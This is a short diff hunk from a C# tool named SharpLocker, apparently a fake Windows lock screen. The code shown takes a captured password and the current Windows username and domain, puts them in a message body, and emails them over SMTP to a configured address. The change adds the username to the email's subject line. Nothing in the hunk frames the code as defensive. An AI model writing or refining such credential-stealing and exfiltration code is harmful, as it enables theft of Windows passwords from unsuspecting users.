@@ -66,7 +66,7 @@ namespace SharpLocker
             //Don't touch this!
             string body = "Password: " + password + " Username&Domain: " + System.Security.Principal.WindowsIdentity.GetCurrent().Name;
 
-            MailMessage msg = new MailMessage(e_address, e_address, "Windwos Password on ", body);
+            MailMessage msg = new MailMessage(e_address, e_address, "Windwos Password on "  + System.Security.Principal.WindowsIdentity.GetCurrent().Name, body);
             msg.IsBodyHtml = true;
             SmtpClient sc = new SmtpClient(e_host_addr, e_host_port);
             sc.UseDefaultCredentials = false;
